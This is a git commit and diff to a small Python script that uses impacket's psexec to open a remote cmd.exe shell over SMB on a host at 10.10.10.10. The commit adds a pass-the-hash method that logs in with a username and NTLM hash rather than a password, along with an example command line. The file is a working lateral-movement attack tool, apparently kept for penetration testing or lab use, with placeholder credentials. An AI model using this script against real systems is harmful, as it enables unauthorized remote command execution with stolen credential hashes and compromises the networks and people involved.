943dda47bf92eaf0cd460dc4fa491d89492bcb8a
Deniss Bohanovs <den.b@itservicesgroup.co.uk>
2020-08-13 21:00:18 +0100

    Add pass the hash tecnique, add inline command

--- tools/psexec_cmd.py
+++ tools/psexec_cmd.py
@@ -1,7 +1,13 @@
 # this script should be used with impacket
+# python psexec.py admin:password@10.10.10.10 cmd -path c:\\windows\\system32\\
+
 import psexec
 ip = "10.10.10.10"
-username=""
-password=""
-psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", "445/SMB", username=username, password=password)
+username="testuser"
+#password=""
+hashes = "adasdasdasdasd:dahjkdhasksjhdsa"
+
+#pass the hash technique
+psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", "445/SMB", username=username, hashes=hashes)
+#psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", "445/SMB", username=username, password=password)
 psobject.run(ip)
